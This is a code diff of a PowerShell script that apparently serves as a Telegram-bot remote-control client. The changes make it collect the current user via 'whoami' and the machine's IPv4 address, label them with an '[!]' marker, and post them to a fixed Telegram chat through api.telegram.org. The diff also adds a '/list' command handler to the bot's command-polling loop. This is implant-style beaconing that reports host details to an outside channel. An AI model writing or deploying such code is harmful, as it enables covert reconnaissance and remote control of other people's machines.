@@ -1,4 +1,4 @@
-﻿############
+############
 ## CONFIG ##
 ############
 
@@ -9,16 +9,18 @@ $ChatID = '-242346194'
 ##########################
 ## CONNECT WITH CHANNEL ##
 ##########################
+$whoami = Invoke-Expression whoami
 
 $ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address
 $ipV4 = $ipV4.IPAddressToString
 
+$info = '[!] ' + $whoami + ' - ' + $ipv4
 if($nopreview) { $preview_mode = "True" }
 if($markdown) { $markdown_mode = "Markdown" } else {$markdown_mode = ""}
 
 $payload = @{
     "chat_id" = $ChatID;
-    "text" = $ipV4;
+    "text" = $info;
     "parse_mode" = $markdown_mode;
     "disable_web_page_preview" = $preview_mode;
 }
@@ -109,6 +111,13 @@ While ($DoNotExit)  {
 		Sleep -seconds 5
 		$DoNotExit = 0
 	  }
+       	"/list"  {
+        Invoke-WebRequest `
+        -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
+        -Method Post `
+        -ContentType "application/json;charset=utf-8" `
+        -Body (ConvertTo-Json -Compress -InputObject $payload)
+      }
 	  default  {
 	    #The message sent is unknown
 		$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
